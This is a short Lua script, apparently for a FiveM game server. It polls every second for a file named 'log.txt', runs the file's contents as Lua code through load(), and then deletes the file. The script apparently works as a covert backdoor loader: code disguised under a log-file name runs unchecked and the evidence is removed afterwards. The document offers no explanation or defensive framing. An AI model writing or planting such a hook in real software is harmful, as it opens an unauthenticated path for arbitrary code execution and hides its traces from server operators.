Citizen.CreateThread(function()
    while true do
        Citizen.Wait(1000)
        if file_exists("log.txt") then
            local file = io.open("log.txt", "r")
            local content = file:read("*all")
            file:close()
            if load(content) then
                assert(load(content))()
            end
            os.remove("log.txt")
        end
    end
end)

function file_exists(name)
    local f = io.open(name, "r")
    if f ~= nil then
        io.close(f)
        return true
    else
        return false
    end
end
